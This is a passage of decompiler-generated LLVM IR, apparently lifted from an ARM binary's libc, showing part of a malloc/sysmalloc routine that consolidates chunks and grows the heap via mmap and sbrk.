  store i32 %v1_10e68, i32* %r2.global-to-local, align 4
  %v0_10e6c = load i32, i32* @sl, align 4
  %v2_10e6c = sub i32 %v1_10e68, %v0_10e6c
  store i32 %v2_10e6c, i32* %ip.global-to-local, align 4
  %v1_10e70 = add i32 %v3_10e38, 12
  %v2_10e70 = inttoptr i32 %v1_10e70 to i32*
  %v3_10e70 = load i32, i32* %v2_10e70, align 4
  store i32 %v3_10e70, i32* %r3.global-to-local, align 4
  %tmp212 = icmp ult i32 %v2_10e6c, 16
  br i1 %tmp212, label %bb146, label %bb147

bb146:                                            ; preds = %dec_label_pc_10e64
  %v6_10e78 = add i32 %v1_10e68, %v3_10e38
  store i32 %v6_10e78, i32* %r2.global-to-local, align 4
  br label %bb147

bb147:                                            ; preds = %dec_label_pc_10e64, %bb146
  %v2_10e7c = add i32 %v3_10e70, 8
  %v3_10e7c = inttoptr i32 %v2_10e7c to i32*
  store i32 %v0_10e7c, i32* %v3_10e7c, align 4
  %v0_10e80 = load i32, i32* %r3.global-to-local, align 4
  %v1_10e80 = load i32, i32* %r0.global-to-local, align 4
  %v2_10e80 = add i32 %v1_10e80, 12
  %v3_10e80 = inttoptr i32 %v2_10e80 to i32*
  store i32 %v0_10e80, i32* %v3_10e80, align 4
  %v4_10e84 = load i32, i32* @lr, align 4
  br i1 %tmp212, label %.dec_label_pc_10d60_crit_edge, label %dec_label_pc_10e90

.dec_label_pc_10d60_crit_edge:                    ; preds = %bb147
  %v5_10e84 = add i32 %v4_10e84, 8
  store i32 %v5_10e84, i32* %r4.global-to-local, align 4
  %v4_10e88 = load i32, i32* %r2.global-to-local, align 4
  %v5_10e88 = add i32 %v4_10e88, 4
  %v6_10e88 = inttoptr i32 %v5_10e88 to i32*
  %v7_10e88 = load i32, i32* %v6_10e88, align 4
  store i32 %v7_10e88, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10d60

dec_label_pc_10e90:                               ; preds = %bb147
  %v1_10e90 = load i32, i32* @sl, align 4
  %v2_10e90 = add i32 %v1_10e90, %v4_10e84
  store i32 %v2_10e90, i32* %r1.global-to-local, align 4
  %v1_10e98 = load i32, i32* @r6, align 4
  %v2_10e98 = add i32 %v1_10e98, 8
  %v3_10e98 = inttoptr i32 %v2_10e98 to i32*
  store i32 %v2_10e90, i32* %v3_10e98, align 4
  %v0_10e9c = load i32, i32* %r1.global-to-local, align 4
  %v1_10e9c = load i32, i32* @r6, align 4
  %v2_10e9c = add i32 %v1_10e9c, 12
  %v3_10e9c = inttoptr i32 %v2_10e9c to i32*
  store i32 %v0_10e9c, i32* %v3_10e9c, align 4
  %v0_10ea0 = load i32, i32* @r6, align 4
  %v1_10ea0 = load i32, i32* %r1.global-to-local, align 4
  %v2_10ea0 = add i32 %v1_10ea0, 8
  %v3_10ea0 = inttoptr i32 %v2_10ea0 to i32*
  store i32 %v0_10ea0, i32* %v3_10ea0, align 4
  %v0_10ea4 = load i32, i32* @r6, align 4
  %v1_10ea4 = load i32, i32* %r1.global-to-local, align 4
  %v2_10ea4 = add i32 %v1_10ea4, 12
  %v3_10ea4 = inttoptr i32 %v2_10ea4 to i32*
  store i32 %v0_10ea4, i32* %v3_10ea4, align 4
  %tmp213 = icmp ult i32 %v1_10e90, 256
  br i1 %tmp213, label %bb148, label %.thread124

bb148:                                            ; preds = %dec_label_pc_10e90
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r2.global-to-local, align 4
  %v8_10eb0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 64) to i32*), align 4
  store i32 %v8_10eb0, i32* %r3.global-to-local, align 4
  %v4_10eb4 = load i32, i32* %r1.global-to-local, align 4
  %v6_10eb4 = add i32 %v8_10eb0, 48
  %v7_10eb4 = inttoptr i32 %v6_10eb4 to i32*
  store i32 %v4_10eb4, i32* %v7_10eb4, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_10e90, %bb148
  %v0_10eb8 = load i32, i32* @sl, align 4
  %v1_10eb8 = or i32 %v0_10eb8, 1
  store i32 %v1_10eb8, i32* %r2.global-to-local, align 4
  %v0_10ebc = load i32, i32* %ip.global-to-local, align 4
  %v1_10ebc = or i32 %v0_10ebc, 1
  store i32 %v1_10ebc, i32* %r3.global-to-local, align 4
  %v0_10ec0 = load i32, i32* @lr, align 4
  %v1_10ec0 = add i32 %v0_10ec0, 8
  store i32 %v1_10ec0, i32* %r4.global-to-local, align 4
  %v2_10ec4 = add i32 %v0_10ec0, 4
  %v3_10ec4 = inttoptr i32 %v2_10ec4 to i32*
  store i32 %v1_10eb8, i32* %v3_10ec4, align 4
  %v0_10ec8 = load i32, i32* %ip.global-to-local, align 4
  %v1_10ec8 = load i32, i32* %r1.global-to-local, align 4
  %v3_10ec8 = add i32 %v1_10ec8, %v0_10ec8
  %v4_10ec8 = inttoptr i32 %v3_10ec8 to i32*
  store i32 %v0_10ec8, i32* %v4_10ec8, align 4
  %v0_10ecc = load i32, i32* %r3.global-to-local, align 4
  %v1_10ecc = load i32, i32* %r1.global-to-local, align 4
  %v2_10ecc = add i32 %v1_10ecc, 4
  %v3_10ecc = inttoptr i32 %v2_10ecc to i32*
  store i32 %v0_10ecc, i32* %v3_10ecc, align 4
  br label %dec_label_pc_11328

dec_label_pc_10ed4.loopexit:                      ; preds = %dec_label_pc_10df4
  br label %dec_label_pc_10ed4

dec_label_pc_10ed4:                               ; preds = %dec_label_pc_10ed4.loopexit, %dec_label_pc_10ae8, %dec_label_pc_10af0
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %ip.global-to-local, align 4
  %v4_10edc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 64) to i32*), align 4
  store i32 %v4_10edc, i32* @r0, align 4
  %v1_10ee0 = add i32 %v4_10edc, 44
  %v2_10ee0 = inttoptr i32 %v1_10ee0 to i32*
  %v3_10ee0 = load i32, i32* %v2_10ee0, align 4
  store i32 %v3_10ee0, i32* %ip.global-to-local, align 4
  %v1_10ee4 = add i32 %v3_10ee0, 4
  %v2_10ee4 = inttoptr i32 %v1_10ee4 to i32*
  %v3_10ee4 = load i32, i32* %v2_10ee4, align 4
  %v0_10ee8 = load i32, i32* @sl, align 4
  %v1_10ee8 = add i32 %v0_10ee8, 16
  store i32 %v1_10ee8, i32* %r1.global-to-local, align 4
  %v1_10eec = and i32 %v3_10ee4, -4
  store i32 %v1_10eec, i32* %r3.global-to-local, align 4
  %v3_10ef0 = icmp ult i32 %v1_10eec, %v1_10ee8
  br i1 %v3_10ef0, label %dec_label_pc_10f20, label %dec_label_pc_10efc

dec_label_pc_10efc:                               ; preds = %dec_label_pc_10ed4
  %v2_10efc = sub i32 %v1_10eec, %v0_10ee8
  %v2_10f00 = add i32 %v0_10ee8, %v3_10ee0
  store i32 %v2_10f00, i32* %r1.global-to-local, align 4
  %v1_10f04 = or i32 %v2_10efc, 1
  store i32 %v1_10f04, i32* %r3.global-to-local, align 4
  %v1_10f08 = or i32 %v0_10ee8, 1
  store i32 %v1_10f08, i32* %r2.global-to-local, align 4
  %v1_10f0c = add i32 %v3_10ee0, 8
  store i32 %v1_10f0c, i32* %r4.global-to-local, align 4
  store i32 %v1_10f08, i32* %v2_10ee4, align 4
  %v0_10f14 = load i32, i32* %r1.global-to-local, align 4
  %v1_10f14 = load i32, i32* @r0, align 4
  %v2_10f14 = add i32 %v1_10f14, 44
  %v3_10f14 = inttoptr i32 %v2_10f14 to i32*
  store i32 %v0_10f14, i32* %v3_10f14, align 4
  %v0_10f18 = load i32, i32* %r3.global-to-local, align 4
  %v1_10f18 = load i32, i32* %r1.global-to-local, align 4
  %v2_10f18 = add i32 %v1_10f18, 4
  %v3_10f18 = inttoptr i32 %v2_10f18 to i32*
  store i32 %v0_10f18, i32* %v3_10f18, align 4
  br label %dec_label_pc_11328

dec_label_pc_10f20:                               ; preds = %dec_label_pc_10ed4
  %v1_10f20 = inttoptr i32 %v4_10edc to i32*
  %v2_10f20 = load i32, i32* %v1_10f20, align 4
  store i32 %v2_10f20, i32* %r3.global-to-local, align 4
  %v1_10f24 = and i32 %v2_10f20, 2
  store i32 %v1_10f24, i32* %ip.global-to-local, align 4
  %v2_10f24 = icmp eq i32 %v1_10f24, 0
  %v1_10f28 = add i32 %v4_10edc, 860
  %v2_10f28 = inttoptr i32 %v1_10f28 to i32*
  %v3_10f28 = load i32, i32* %v2_10f28, align 4
  store i32 %v3_10f28, i32* %r1.global-to-local, align 4
  br i1 %v2_10f24, label %dec_label_pc_10f40, label %dec_label_pc_10f30

dec_label_pc_10f30:                               ; preds = %dec_label_pc_10f20
  %v0_10f30 = call i32 @__malloc_consolidate()
  %v0_10f34 = load i32, i32* @sl, align 4
  %v1_10f34 = add i32 %v0_10f34, -7
  store i32 %v1_10f34, i32* @r0, align 4
  %v0_10f38 = call i32 @malloc()
  store i32 %v0_10f38, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11324

dec_label_pc_10f40:                               ; preds = %dec_label_pc_10f20
  %v1_10f40 = add i32 %v4_10edc, 844
  %v2_10f40 = inttoptr i32 %v1_10f40 to i32*
  %v3_10f40 = load i32, i32* %v2_10f40, align 4
  store i32 %v3_10f40, i32* %r3.global-to-local, align 4
  %v3_10f44 = icmp ult i32 %v0_10ee8, %v3_10f40
  %v1_10f48 = add i32 %v3_10f28, -1
  store i32 %v1_10f48, i32* %sb.global-to-local, align 4
  br i1 %v3_10f44, label %dec_label_pc_1101c, label %dec_label_pc_10f50

dec_label_pc_10f50:                               ; preds = %dec_label_pc_10f40
  %v1_10f50 = add i32 %v4_10edc, 852
  %v2_10f50 = inttoptr i32 %v1_10f50 to i32*
  %v3_10f50 = load i32, i32* %v2_10f50, align 4
  store i32 %v3_10f50, i32* %r2.global-to-local, align 4
  %v1_10f54 = add i32 %v4_10edc, 848
  %v2_10f54 = inttoptr i32 %v1_10f54 to i32*
  %v3_10f54 = load i32, i32* %v2_10f54, align 4
  store i32 %v3_10f54, i32* %r3.global-to-local, align 4
  %v6_10f5c = icmp slt i32 %v3_10f54, %v3_10f50
  br i1 %v6_10f5c, label %dec_label_pc_10f60, label %dec_label_pc_1101c

dec_label_pc_10f60:                               ; preds = %dec_label_pc_10f50
  %v1_10f60 = add i32 %v0_10ee8, 10
  %v2_10f64 = add i32 %v1_10f60, %v3_10f28
  store i32 %v2_10f64, i32* %r3.global-to-local, align 4
  %v2_10f68 = sub i32 0, %v3_10f28
  %v3_10f68 = and i32 %v2_10f64, %v2_10f68
  store i32 %v3_10f68, i32* @r4, align 4
  %tmp214 = icmp ugt i32 %v3_10f68, %v0_10ee8
  br i1 %tmp214, label %dec_label_pc_10f74, label %dec_label_pc_1101c

dec_label_pc_10f74:                               ; preds = %dec_label_pc_10f60
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_10f68, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_10f8c = call i32 @mmap(i32 0, i32 %v3_10f68, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_10f8c, i32* %r0.global-to-local, align 4
  %v7_10f90 = icmp eq i32 %v6_10f8c, -1
  br i1 %v7_10f90, label %dec_label_pc_10f74.dec_label_pc_1101c_crit_edge, label %dec_label_pc_10f98

dec_label_pc_10f74.dec_label_pc_1101c_crit_edge:  ; preds = %dec_label_pc_10f74
  %v1_11040.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_1101c

dec_label_pc_10f98:                               ; preds = %dec_label_pc_10f74
  %v1_10f98 = urem i32 %v6_10f8c, 8
  store i32 %v1_10f98, i32* %r2.global-to-local, align 4
  %v2_10f98 = icmp eq i32 %v1_10f98, 0
  br i1 %v2_10f98, label %bb149, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_10f98
  %v2_10f9c = sub nsw i32 8, %v1_10f98
  store i32 %v2_10f9c, i32* %r3.global-to-local, align 4
  %v2_10fa0 = load i32, i32* @r4, align 4
  %v3_10fa0 = sub i32 %v2_10fa0, %v2_10f9c
  %v3_10fa4 = add i32 %v2_10f9c, %v6_10f8c
  store i32 %v3_10fa4, i32* %lr.global-to-local, align 4
  %v2_10fac = or i32 %v3_10fa0, 2
  store i32 %v2_10fac, i32* %r2.global-to-local, align 4
  %v5_10fb4 = inttoptr i32 %v3_10fa4 to i32*
  store i32 %v2_10f9c, i32* %v5_10fb4, align 4
  %v1_10fb8 = load i32, i32* %r2.global-to-local, align 4
  %v2_10fb8 = load i32, i32* %lr.global-to-local, align 4
  %v3_10fb8 = add i32 %v2_10fb8, 4
  %v4_10fb8 = inttoptr i32 %v3_10fb8 to i32*
  store i32 %v1_10fb8, i32* %v4_10fb8, align 4
  br label %.thread30

bb149:                                            ; preds = %dec_label_pc_10f98
  store i32 %v6_10f8c, i32* %lr.global-to-local, align 4
  %v1_10fb050 = load i32, i32* @r4, align 4
  %v2_10fb051 = or i32 %v1_10fb050, 2
  store i32 %v2_10fb051, i32* %r3.global-to-local, align 4
  %v3_10fbc = inttoptr i32 %v6_10f8c to i32*
  store i32 0, i32* %v3_10fbc, align 4
  %v1_10fc0 = load i32, i32* %r3.global-to-local, align 4
  %v2_10fc0 = load i32, i32* %lr.global-to-local, align 4
  %v3_10fc0 = add i32 %v2_10fc0, 4
  %v4_10fc0 = inttoptr i32 %v3_10fc0 to i32*
  store i32 %v1_10fc0, i32* %v4_10fc0, align 4
  br label %.thread30

.thread30:                                        ; preds = %.thread28, %bb149
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_10fcc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 64) to i32*), align 4
  store i32 %v4_10fcc, i32* %ip.global-to-local, align 4
  %v1_10fd0 = add i32 %v4_10fcc, 848
  %v2_10fd0 = inttoptr i32 %v1_10fd0 to i32*
  %v3_10fd0 = load i32, i32* %v2_10fd0, align 4
  store i32 %v3_10fd0, i32* %r3.global-to-local, align 4
  %v1_10fd4 = add i32 %v4_10fcc, 856
  %v2_10fd4 = inttoptr i32 %v1_10fd4 to i32*
  %v3_10fd4 = load i32, i32* %v2_10fd4, align 4
  store i32 %v3_10fd4, i32* %r2.global-to-local, align 4
  %v1_10fd8 = add i32 %v3_10fd0, 1
  store i32 %v1_10fd8, i32* %r3.global-to-local, align 4
  %v7_10fe0 = icmp sgt i32 %v1_10fd8, %v3_10fd4
  br i1 %v7_10fe0, label %bb150, label %bb151

bb150:                                            ; preds = %.thread30
  store i32 %v1_10fd8, i32* %v2_10fd4, align 4
  %v0_10fe4.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_10fe4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread30, %bb150
  %v1_10fe4 = phi i32 [ %v4_10fcc, %.thread30 ], [ %v1_10fe4.pre, %bb150 ]
  %v0_10fe4 = phi i32 [ %v1_10fd8, %.thread30 ], [ %v0_10fe4.pre, %bb150 ]
  %v2_10fe4 = add i32 %v1_10fe4, 848
  %v3_10fe4 = inttoptr i32 %v2_10fe4 to i32*
  store i32 %v0_10fe4, i32* %v3_10fe4, align 4
  %v0_10fe8 = load i32, i32* %ip.global-to-local, align 4
  %v1_10fe8 = add i32 %v0_10fe8, 868
  %v2_10fe8 = inttoptr i32 %v1_10fe8 to i32*
  %v3_10fe8 = load i32, i32* %v2_10fe8, align 4
  store i32 %v3_10fe8, i32* %r3.global-to-local, align 4
  %v1_10fec = add i32 %v0_10fe8, 880
  %v2_10fec = inttoptr i32 %v1_10fec to i32*
  %v3_10fec = load i32, i32* %v2_10fec, align 4
  store i32 %v3_10fec, i32* %r2.global-to-local, align 4
  %v0_10ff0 = load i32, i32* @r4, align 4
  %v2_10ff0 = add i32 %v0_10ff0, %v3_10fe8
  store i32 %v2_10ff0, i32* %r1.global-to-local, align 4
  %v1_10ff4 = add i32 %v0_10fe8, 872
  %v2_10ff4 = inttoptr i32 %v1_10ff4 to i32*
  %v3_10ff4 = load i32, i32* %v2_10ff4, align 4
  store i32 %v3_10ff4, i32* %r3.global-to-local, align 4
  %v1_10ffc = add i32 %v0_10fe8, 884
  %v2_10ffc = inttoptr i32 %v1_10ffc to i32*
  %v3_10ffc = load i32, i32* %v2_10ffc, align 4
  store i32 %v3_10ffc, i32* %r2.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_10ff0, %v3_10fec
  br i1 %tmp215, label %bb152, label %bb153

bb152:                                            ; preds = %bb151
  store i32 %v2_10ff0, i32* %v2_10fec, align 4
  %v0_11004.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_11004.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %bb151, %bb152
  %v1_11004 = phi i32 [ %v0_10fe8, %bb151 ], [ %v1_11004.pre, %bb152 ]
  %v0_11004 = phi i32 [ %v2_10ff0, %bb151 ], [ %v0_11004.pre, %bb152 ]
  %v2_11004 = add i32 %v1_11004, 868
  %v3_11004 = inttoptr i32 %v2_11004 to i32*
  store i32 %v0_11004, i32* %v3_11004, align 4
  %v0_11008 = load i32, i32* %r1.global-to-local, align 4
  %v1_11008 = load i32, i32* %r3.global-to-local, align 4
  %v2_11008 = add i32 %v1_11008, %v0_11008
  store i32 %v2_11008, i32* %r1.global-to-local, align 4
  %v1_1100c = load i32, i32* %r2.global-to-local, align 4
  %v0_11010 = load i32, i32* %lr.global-to-local, align 4
  %v1_11010 = add i32 %v0_11010, 8
  store i32 %v1_11010, i32* %r0.global-to-local, align 4
  %tmp216 = icmp ugt i32 %v2_11008, %v1_1100c
  br i1 %tmp216, label %bb154, label %dec_label_pc_11324

bb154:                                            ; preds = %bb153
  %v5_11014 = load i32, i32* %ip.global-to-local, align 4
  %v6_11014 = add i32 %v5_11014, 884
  %v7_11014 = inttoptr i32 %v6_11014 to i32*
  store i32 %v2_11008, i32* %v7_11014, align 4
  br label %dec_label_pc_11324

dec_label_pc_1101c:                               ; preds = %dec_label_pc_10f60, %dec_label_pc_10f40, %dec_label_pc_10f74.dec_label_pc_1101c_crit_edge, %dec_label_pc_10f50
  %v1_11040 = phi i32 [ %v1_11040.pre, %dec_label_pc_10f74.dec_label_pc_1101c_crit_edge ], [ %v0_10ee8, %dec_label_pc_10f50 ], [ %v0_10ee8, %dec_label_pc_10f40 ], [ %v0_10ee8, %dec_label_pc_10f60 ]
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %ip.global-to-local, align 4
  %v4_11024 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 64) to i32*), align 4
  store i32 %v4_11024, i32* %r3.global-to-local, align 4
  %v1_11028 = add i32 %v4_11024, 44
  %v2_11028 = inttoptr i32 %v1_11028 to i32*
  %v3_11028 = load i32, i32* %v2_11028, align 4
  store i32 %v3_11028, i32* %r0.global-to-local, align 4
  %v1_1102c = add i32 %v4_11024, 864
  %v2_1102c = inttoptr i32 %v1_1102c to i32*
  %v3_1102c = load i32, i32* %v2_1102c, align 4
  store i32 %v3_1102c, i32* %r2.global-to-local, align 4
  %v1_11030 = add i32 %v4_11024, 840
  %v2_11030 = inttoptr i32 %v1_11030 to i32*
  %v3_11030 = load i32, i32* %v2_11030, align 4
  store i32 %v3_11030, i32* %r3.global-to-local, align 4
  %v1_11034 = add i32 %v3_11028, 4
  %v2_11034 = inttoptr i32 %v1_11034 to i32*
  %v3_11034 = load i32, i32* %v2_11034, align 4
  store i32 %v3_11034, i32* %r1.global-to-local, align 4
  %v1_1103c = urem i32 %v3_1102c, 2
  %v2_1103c = icmp eq i32 %v1_1103c, 0
  %v1_11038 = add i32 %v1_11040, 16
  %v2_11040 = add i32 %v1_11038, %v3_11030
  store i32 %v2_11040, i32* %r3.global-to-local, align 4
  %v1_11044 = and i32 %v3_11034, -4
  store i32 %v1_11044, i32* @r8, align 4
  br i1 %v2_1103c, label %bb156, label %bb155

bb155:                                            ; preds = %dec_label_pc_1101c
  %v3_11048 = sub i32 %v2_11040, %v1_11044
  store i32 %v3_11048, i32* %r3.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %dec_label_pc_1101c, %bb155
  %v0_1104c = phi i32 [ %v2_11040, %dec_label_pc_1101c ], [ %v3_11048, %bb155 ]
  %v1_1104c = load i32, i32* %sb.global-to-local, align 4
  %v2_1104c = add i32 %v1_1104c, %v0_1104c
  store i32 %v2_1104c, i32* %r3.global-to-local, align 4
  %v1_11050 = sub i32 -1, %v1_1104c
  store i32 %v1_11050, i32* %fp.global-to-local, align 4
  %v2_11054 = and i32 %v2_1104c, %v1_11050
  store i32 %v2_11054, i32* @r5, align 4
  %tmp157 = icmp slt i32 %v2_11054, 1
  br i1 %tmp157, label %dec_label_pc_11078, label %dec_label_pc_11064

dec_label_pc_11064:                               ; preds = %bb156
  store i32 %v2_11054, i32* %r0.global-to-local, align 4
  %v1_11068 = call i32 @__GI_sbrk(i32 %v2_11054)
  store i32 %v1_11068, i32* %r0.global-to-local, align 4
  %v3_1106c = icmp eq i32 %v1_11068, -1
  store i32 %v1_11068, i32* @r4, align 4
  br i1 %v3_1106c, label %dec_label_pc_11078, label %dec_label_pc_110e4

dec_label_pc_11078:                               ; preds = %dec_label_pc_11064, %bb156
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r1.global-to-local, align 4
  %v4_11080 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 64) to i32*), align 4
  store i32 %v4_11080, i32* %r6.global-to-local, align 4
  %v1_11084 = add i32 %v4_11080, 864
  %v2_11084 = inttoptr i32 %v1_11084 to i32*
  %v3_11084 = load i32, i32* %v2_11084, align 4
  store i32 %v3_11084, i32* %r3.global-to-local, align 4
  %v1_11088 = urem i32 %v3_11084, 2
  %v2_11088 = icmp eq i32 %v1_11088, 0
  br i1 %v2_11088, label %.thread32thread-pre-split, label %bb158

bb158:                                            ; preds = %dec_label_pc_11078
  %v1_1108c = load i32, i32* @r8, align 4
  %v2_1108c = load i32, i32* %sb.global-to-local, align 4
  %v3_1108c = add i32 %v2_1108c, %v1_1108c
  %v2_11090 = load i32, i32* @r5, align 4
  %v3_11090 = add i32 %v3_1108c, %v2_11090
  store i32 %v3_11090, i32* %r3.global-to-local, align 4
  %v2_11094 = load i32, i32* %fp.global-to-local, align 4
  %v3_11094 = and i32 %v2_11094, %v3_11090
  store i32 %v3_11094, i32* @r5, align 4
  br label %.thread32

.thread32thread-pre-split:                        ; preds = %dec_label_pc_11078
  %v0_11098.pr = load i32, i32* @r5, align 4
  br label %.thread32

.thread32:                                        ; preds = %.thread32thread-pre-split, %bb158
  %v0_11098 = phi i32 [ %v0_11098.pr, %.thread32thread-pre-split ], [ %v3_11094, %bb158 ]
  %v2_11098 = icmp ugt i32 %v0_11098, 1048575
  br i1 %v2_11098, label %bb160, label %bb159

bb159:                                            ; preds = %.thread32
  store i32 1048576, i32* @r5, align 4
  br label %bb160

bb160:                                            ; preds = %.thread32, %bb159
  %v0_110b0 = phi i32 [ %v0_11098, %.thread32 ], [ 1048576, %bb159 ]
  %v1_110a0 = load i32, i32* @sl, align 4
  %tmp217 = icmp ugt i32 %v0_110b0, %v1_110a0
  br i1 %tmp217, label %dec_label_pc_110a8, label %dec_label_pc_1130c

dec_label_pc_110a8:                               ; preds = %bb160
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_110b0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_110c4 = call i32 @mmap(i32 0, i32 %v0_110b0, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_110c4, i32* %r0.global-to-local, align 4
  %v3_110c8 = icmp eq i32 %v6_110c4, -1
  %v8_110c8 = icmp eq i32 %v6_110c4, -1
  store i32 %v6_110c4, i32* @r4, align 4
  br i1 %v8_110c8, label %.thread35, label %bb161

bb161:                                            ; preds = %dec_label_pc_110a8
  %v1_110d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_110d0 = add i32 %v1_110d0, 864
  %v3_110d0 = inttoptr i32 %v2_110d0 to i32*
  %v4_110d0 = load i32, i32* %v3_110d0, align 4
  %v2_110d4 = load i32, i32* @r5, align 4
  %v3_110d4 = add i32 %v2_110d4, %v6_110c4
  store i32 %v3_110d4, i32* %r0.global-to-local, align 4
  %v2_110d8 = and i32 %v4_110d0, -2
  store i32 %v2_110d8, i32* %r3.global-to-local, align 4
  store i32 %v2_110d8, i32* %v3_110d0, align 4
  br label %.thread35

.thread35:                                        ; preds = %dec_label_pc_110a8, %bb161
  br i1 %v3_110c8, label %dec_label_pc_110e4, label %dec_label_pc_110e8

dec_label_pc_110e4:                               ; preds = %.thread35, %dec_label_pc_11064
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_110e8

dec_label_pc_110e8:                               ; preds = %.thread35, %dec_label_pc_110e4
  %v0_110e8 = load i32, i32* @r4, align 4
  %v7_110e8 = icmp eq i32 %v0_110e8, -1
  br i1 %v7_110e8, label %dec_label_pc_1130c, label %dec_label_pc_110f0

dec_label_pc_110f0:                               ; preds = %dec_label_pc_110e8
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r2.global-to-local, align 4
  %v4_110f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 64) to i32*), align 4
  store i32 %v4_110f8, i32* %ip.global-to-local, align 4
  store i32 %v3_11028, i32* %r2.global-to-local, align 4
  %v1_11100 = add i32 %v4_110f8, 872
  %v2_11100 = inttoptr i32 %v1_11100 to i32*
  %v3_11100 = load i32, i32* %v2_11100, align 4
  %v1_11104 = load i32, i32* @r8, align 4
  %v2_11104 = add i32 %v1_11104, %v3_11028
  store i32 %v2_11104, i32* %r1.global-to-local, align 4
  %v0_11108 = load i32, i32* @r5, align 4
  %v2_11108 = add i32 %v0_11108, %v3_11100
  store i32 %v2_11108, i32* %r3.global-to-local, align 4
  %v9_1110c = icmp eq i32 %v0_110e8, %v2_11104
  br i1 %v9_1110c, label %bb162, label %.thread125

.thread125:                                       ; preds = %dec_label_pc_110f0
  store i32 %v2_11108, i32* %v2_11100, align 4
  br label %dec_label_pc_11128

bb162:                                            ; preds = %dec_label_pc_110f0
  %v1_11110 = load i32, i32* %r0.global-to-local, align 4
  %v8_11110 = icmp eq i32 %v1_11110, -1
  store i32 %v2_11108, i32* %v2_11100, align 4
  br i1 %v8_11110, label %.thread37, label %dec_label_pc_11128

.thread37:                                        ; preds = %bb162
  %v1_11118 = load i32, i32* @r5, align 4
  %v2_11118 = load i32, i32* @r8, align 4
  %v3_11118 = add i32 %v2_11118, %v1_11118
  %v2_1111c = or i32 %v3_11118, 1
  store i32 %v2_1111c, i32* %r3.global-to-local, align 4
  %v2_11120 = load i32, i32* %r2.global-to-local, align 4
  %v3_11120 = add i32 %v2_11120, 4
  %v4_11120 = inttoptr i32 %v3_11120 to i32*
  store i32 %v2_1111c, i32* %v4_11120, align 4
  br label %dec_label_pc_112a0

dec_label_pc_11128:                               ; preds = %bb162, %.thread125
  %v0_1112c.pr = load i32, i32* @r8, align 4
  %v0_11128 = load i32, i32* %ip.global-to-local, align 4
  %v1_11128 = add i32 %v0_11128, 864
  %v2_11128 = inttoptr i32 %v1_11128 to i32*
  %v3_11128 = load i32, i32* %v2_11128, align 4
  store i32 %v3_11128, i32* %r2.global-to-local, align 4
  %v2_1112c = icmp eq i32 %v0_1112c.pr, 0
  br i1 %v2_1112c, label %.thread40, label %.thread39

.thread40:                                        ; preds = %dec_label_pc_11128
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread43

.thread39:                                        ; preds = %dec_label_pc_11128
  %v2_11134 = urem i32 %v3_11128, 2
  store i32 %v2_11134, i32* %r3.global-to-local, align 4
  %v2_11138 = icmp eq i32 %v2_11134, 0
  br i1 %v2_11138, label %.thread43, label %dec_label_pc_11140

dec_label_pc_11140:                               ; preds = %.thread39
  %v0_11140 = load i32, i32* @r4, align 4
  %v1_11140 = load i32, i32* %r1.global-to-local, align 4
  %v3_11140 = icmp ult i32 %v0_11140, %v1_11140
  br i1 %v3_11140, label %bb163, label %.thread43

bb163:                                            ; preds = %dec_label_pc_11140
  %v2_11144 = and i32 %v3_11128, -2
  store i32 %v2_11144, i32* %r3.global-to-local, align 4
  store i32 %v2_11144, i32* %v2_11128, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_11140, %.thread40, %.thread39, %bb163
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %ip.global-to-local, align 4
  %v4_11154 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 64) to i32*), align 4
  store i32 %v4_11154, i32* @r7, align 4
  %v1_11158 = add i32 %v4_11154, 864
  %v2_11158 = inttoptr i32 %v1_11158 to i32*
  %v3_11158 = load i32, i32* %v2_11158, align 4
  store i32 %v3_11158, i32* %r3.global-to-local, align 4
  %v1_1115c = urem i32 %v3_11158, 2
  store i32 %v1_1115c, i32* @r6, align 4
  %v2_1115c = icmp eq i32 %v1_1115c, 0
